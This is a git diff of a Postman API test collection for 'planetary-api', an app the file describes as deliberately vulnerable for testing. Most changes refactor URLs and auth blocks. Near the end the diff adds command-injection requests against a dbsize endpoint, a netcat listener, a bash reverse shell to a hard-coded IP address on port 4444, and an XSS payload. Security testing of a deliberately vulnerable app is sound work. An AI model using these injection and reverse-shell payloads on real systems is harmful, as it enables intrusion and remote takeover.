@@ -1,8 +1,10 @@
 {
 	"info": {
-		"_postman_id": "69976c46-79a2-456d-8b8d-39a6a9a48b77",
+		"_postman_id": "6d4ff55b-44f9-49af-a9e8-e5fc01367633",
 		"name": "planetary-api",
-		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+		"description": "Planetary API is deliberately vulnerable code for test purposes",
+		"schema": "https://schema.getpostman.com/json/collection/v2.0.0/collection.json",
+		"_exporter_id": "19909390"
 	},
 	"item": [
 		{
@@ -27,7 +29,8 @@
 									"    pm.expect(jsonData.message).to.eql(\"Bad email or password\");",
 									"});"
 								],
-								"type": "text/javascript"
+								"type": "text/javascript",
+								"packages": {}
 							}
 						}
 					],
@@ -46,16 +49,7 @@
 								}
 							}
 						},
-						"url": {
-							"raw": "http://{{host}}/login",
-							"protocol": "http",
-							"host": [
-								"{{host}}"
-							],
-							"path": [
-								"login"
-							]
-						}
+						"url": "http://{{host}}:{{port}}/login"
 					},
 					"response": []
 				},
@@ -78,7 +72,8 @@
 									"    pm.expect(jsonData.message).to.eql(\"Bad email or password\");",
 									"});"
 								],
-								"type": "text/javascript"
+								"type": "text/javascript",
+								"packages": {}
 							}
 						}
 					],
@@ -97,16 +92,7 @@
 								}
 							}
 						},
-						"url": {
-							"raw": "http://{{host}}/login",
-							"protocol": "http",
-							"host": [
-								"{{host}}"
-							],
-							"path": [
-								"login"
-							]
-						}
+						"url": "http://{{host}}:{{port}}/login"
 					},
 					"response": []
 				},
@@ -129,7 +115,8 @@
 									"    pm.expect(jsonData.message).to.eql(\"Login succeeded!\");",
 									"});"
 								],
-								"type": "text/javascript"
+								"type": "text/javascript",
+								"packages": {}
 							}
 						}
 					],
@@ -148,16 +135,7 @@
 								}
 							}
 						},
-						"url": {
-							"raw": "http://{{host}}/login",
-							"protocol": "http",
-							"host": [
-								"{{host}}"
-							],
-							"path": [
-								"login"
-							]
-						}
+						"url": "http://{{host}}:{{port}}/login"
 					},
 					"response": []
 				},
@@ -171,7 +149,8 @@
 									"var jsonData = pm.response.json();",
 									"pm.environment.set(\"id\", jsonData.id);"
 								],
-								"type": "text/javascript"
+								"type": "text/javascript",
+								"packages": {}
 							}
 						},
 						{
@@ -180,20 +159,17 @@
 								"exec": [
 									""
 								],
-								"type": "text/javascript"
+								"type": "text/javascript",
+								"packages": {}
 							}
 						}
 					],
 					"request": {
 						"auth": {
 							"type": "bearer",
-							"bearer": [
-								{
-									"key": "token",
-									"value": "{{access_token}}",
-									"type": "string"
-								}
-							]
+							"bearer": {
+								"token": "{{access_token}}"
+							}
 						},
 						"method": "POST",
 						"header": [],
@@ -232,16 +208,7 @@
 								}
 							]
 						},
-						"url": {
-							"raw": "http://{{host}}/add_planet",
-							"protocol": "http",
-							"host": [
-								"{{host}}"
-							],
-							"path": [
-								"add_planet"
-							]
-						}
+						"url": "http://{{host}}:{{port}}/add_planet"
 					},
 					"response": []
 				},
@@ -264,13 +231,9 @@
 					"request": {
 						"auth": {
 							"type": "bearer",
-							"bearer": [
-								{
-									"key": "token",
-									"value": "{{access_token}}",
-									"type": "string"
-								}
-							]
+							"bearer": {
+								"token": "{{access_token}}"
+							}
 						},
 						"method": "POST",
 						"header": [],
@@ -283,17 +246,7 @@
 								}
 							}
 						},
-						"url": {
-							"raw": "http://localhost:5000/add_planet",
-							"protocol": "http",
-							"host": [
-								"localhost"
-							],
-							"port": "5000",
-							"path": [
-								"add_planet"
-							]
-						}
+						"url": "http://{{host}}:{{port}}/add_planet"
 					},
 					"response": []
 				},
@@ -323,17 +276,7 @@
 					"request": {
 						"method": "GET",
 						"header": [],
-						"url": {
-							"raw": "http://{{host}}/planet_details/{{id}}",
-							"protocol": "http",
-							"host": [
-								"{{host}}"
-							],
-							"path": [
-								"planet_details",
-								"{{id}}"
-							]
-						}
+						"url": "http://{{host}}:{{port}}/planet_details/{{id}}"
 					},
 					"response": []
 				},
@@ -342,35 +285,22 @@
 					"request": {
 						"auth": {
 							"type": "bearer",
-							"bearer": [
-								{
-									"key": "token",
-									"value": "{{access_token}}",
-									"type": "string"
-								}
-							]
+							"bearer": {
+								"token": "{{access_token}}"
+							}
 						},
 						"method": "PUT",
 						"header": [],
 						"body": {
 							"mode": "raw",
-							"raw": "{   \"planet_id\":{{id}}, \n    \"planet_name\":\"Mercury\",\n    \"planet_type\":\"Class A\",\n        \"home_star\":\"Sol\",\n        \"mass\":2.258e23,\n        \"radius\":1516,\n        \"distance\":35.98e6}",
+							"raw": "{\n    \"planet_id\": {{id}},\n    \"planet_name\": \"Mercury\",\n    \"planet_type\": \"Class A\",\n    \"home_star\": \"Sol\",\n    \"mass\": 2.258e23,\n    \"radius\": 1516,\n    \"distance\": 35.98e6\n}",
 							"options": {
 								"raw": {
 									"language": "json"
 								}
 							}
 						},
-						"url": {
-							"raw": "http://{{host}}/update_planet",
-							"protocol": "http",
-							"host": [
-								"{{host}}"
-							],
-							"path": [
-								"update_planet"
-							]
-						}
+						"url": "http://{{host}}:{{port}}/update_planet"
 					},
 					"response": []
 				},
@@ -397,16 +327,7 @@
 					"request": {
 						"method": "GET",
 						"header": [],
-						"url": {
-							"raw": "http://{{host}}/planets",
-							"protocol": "http",
-							"host": [
-								"{{host}}"
-							],
-							"path": [
-								"planets"
-							]
-						}
+						"url": "http://{{host}}:{{port}}/planets"
 					},
 					"response": []
 				},
@@ -429,17 +350,7 @@
 					"request": {
 						"method": "GET",
 						"header": [],
-						"url": {
-							"raw": "http://{{host}}/dbsize/planets.db",
-							"protocol": "http",
-							"host": [
-								"{{host}}"
-							],
-							"path": [
-								"dbsize",
-								"planets.db"
-							]
-						}
+						"url": "http://{{host}}:{{port}}/dbsize/planets.db"
 					},
 					"response": []
 				},
@@ -462,27 +373,36 @@
 					"request": {
 						"auth": {
 							"type": "bearer",
-							"bearer": [
-								{
-									"key": "token",
-									"value": "{{access_token}}",
-									"type": "string"
-								}
-							]
+							"bearer": {
+								"token": "{{access_token}}"
+							}
 						},
 						"method": "DELETE",
 						"header": [],
-						"url": {
-							"raw": "http://{{host}}/remove_planet/{{id}}",
-							"protocol": "http",
-							"host": [
-								"{{host}}"
-							],
-							"path": [
-								"remove_planet",
-								"{{id}}"
-							]
+						"url": "http://{{host}}:{{port}}/remove_planet/{{id}}"
+					},
+					"response": []
+				},
+				{
+					"name": "Forgot Password",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test(\"Status code is 200\", function () {",
+									"    pm.response.to.have.status(200);",
+									"});",
+									""
+								],
+								"type": "text/javascript"
+							}
 						}
+					],
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": "http://{{host}}:{{port}}/retrieve_password/{{email}}"
 					},
 					"response": []
 				}
@@ -534,13 +454,9 @@
 					"request": {
 						"auth": {
 							"type": "bearer",
-							"bearer": [
-								{
-									"key": "token",
-									"value": "{{access_token}}",
-									"type": "string"
-								}
-							]
+							"bearer": {
+								"token": "{{access_token}}"
+							}
 						},
 						"method": "POST",
 						"header": [],
@@ -579,16 +495,7 @@
 								}
 							]
 						},
-						"url": {
-							"raw": "http://{{host}}/add_planet",
-							"protocol": "http",
-							"host": [
-								"{{host}}"
-							],
-							"path": [
-								"add_planet"
-							]
-						}
+						"url": "http://{{host}}:{{port}}/add_planet"
 					},
 					"response": []
 				},
@@ -614,13 +521,9 @@
 					"request": {
 						"auth": {
 							"type": "bearer",
-							"bearer": [
-								{
-									"key": "token",
-									"value": "{{access_token}}",
-									"type": "string"
-								}
-							]
+							"bearer": {
+								"token": "{{access_token}}"
+							}
 						},
 						"method": "POST",
 						"header": [],
@@ -633,17 +536,7 @@
 								}
 							}
 						},
-						"url": {
-							"raw": "http://localhost:5000/add_planet",
-							"protocol": "http",
-							"host": [
-								"localhost"
-							],
-							"port": "5000",
-							"path": [
-								"add_planet"
-							]
-						}
+						"url": "http://{{host}}:{{port}}/add_planet"
 					},
 					"response": []
 				},
@@ -685,16 +578,7 @@
 								}
 							}
 						},
-						"url": {
-							"raw": "http://{{host}}/login",
-							"protocol": "http",
-							"host": [
-								"{{host}}"
-							],
-							"path": [
-								"login"
-							]
-						}
+						"url": "http://{{host}}:{{port}}/login"
 					},
 					"response": []
 				},
@@ -736,16 +620,7 @@
 								}
 							}
 						},
-						"url": {
-							"raw": "http://{{host}}/login",
-							"protocol": "http",
-							"host": [
-								"{{host}}"
-							],
-							"path": [
-								"login"
-							]
-						}
+						"url": "http://{{host}}:{{port}}/login"
 					},
 					"response": []
 				},
@@ -760,29 +635,66 @@
 									"    pm.response.to.have.status(400);",
 									"});",
 									"",
-									"pm.test(\"Error - CMD Injection\", function () {",
-									"    var jsonData = pm.response.json();",
-									"    pm.expect(jsonData.message).to.eql(\"Error\");",
-									"});"
+									""
 								],
-								"type": "text/javascript"
+								"type": "text/javascript",
+								"packages": {}
 							}
 						}
 					],
 					"request": {
 						"method": "GET",
 						"header": [],
-						"url": {
-							"raw": "http://{{host}}/dbsize/planets.db;ls",
-							"protocol": "http",
-							"host": [
-								"{{host}}"
-							],
-							"path": [
-								"dbsize",
-								"planets.db;ls"
-							]
+						"url": "http://{{host}}:{{port}}/dbsize/planets.db;nc -lnv -p 4444"
+					},
+					"response": []
+				},
+				{
+					"name": "dbsize cmd injection Bind Shell",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test(\"Status code is 400 - CMD Injection\", function () {",
+									"    pm.response.to.have.status(400);",
+									"});",
+									"",
+									""
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
 						}
+					],
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": "http://{{host}}:{{port}}/dbsize/planets.db;/bin/bash -i >& /dev/tcp/80.235.215.60/4444 0>&1"
+					},
+					"response": []
+				},
+				{
+					"name": "dbsize XSS",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test(\"Status code is 200\", function () {",
+									"    pm.response.to.have.status(200);",
+									"});",
+									""
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
+						}
+					],
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": "http://{{host}}:{{port}}/dbsize/planets.db;echo '<BODY ONLOAD=alert(\"xss\")>'"
 					},
 					"response": []
 				}
